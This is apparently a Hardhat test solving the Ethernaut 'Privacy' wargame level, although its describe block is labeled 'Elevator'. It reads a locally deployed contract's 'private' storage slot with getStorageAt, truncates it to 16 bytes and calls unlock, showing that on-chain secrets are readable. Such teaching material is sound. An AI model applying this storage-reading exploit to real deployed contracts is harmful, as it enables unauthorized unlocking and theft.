import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract, utils } from 'ethers';
import { ethers } from 'hardhat';

const { provider } = ethers;

const dataInBytes = [
  utils.formatBytes32String('password'),
  utils.formatBytes32String('passwordasd'),
  utils.formatBytes32String('password3password3password3'),
];

describe('Elevator', () => {
  let owner: SignerWithAddress;
  let user1: SignerWithAddress;
  let user2: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  before(async () => {
    [owner, user1, user2, attacker] = await ethers.getSigners();

    const Factory = await ethers.getContractFactory('Privacy');
    contract = await Factory.deploy(dataInBytes);
    await contract.deployed();
  });

  it('attack', async () => {
    // const locked = await provider.getStorageAt(contract.address, 0);
    // const ID = await provider.getStorageAt(contract.address, 1);
    // const flatteningDenominationAwkwardness = await provider.getStorageAt(contract.address, 2);
    // const data0 = await provider.getStorageAt(contract.address, 3);
    // const data1 = await provider.getStorageAt(contract.address, 4);
    const data2 = await provider.getStorageAt(contract.address, 5);

    const tx = await contract.unlock(utils.hexDataSlice(data2, 0, 16));
    await tx.wait();

    expect(await contract.locked()).to.equal(false);
  });
});
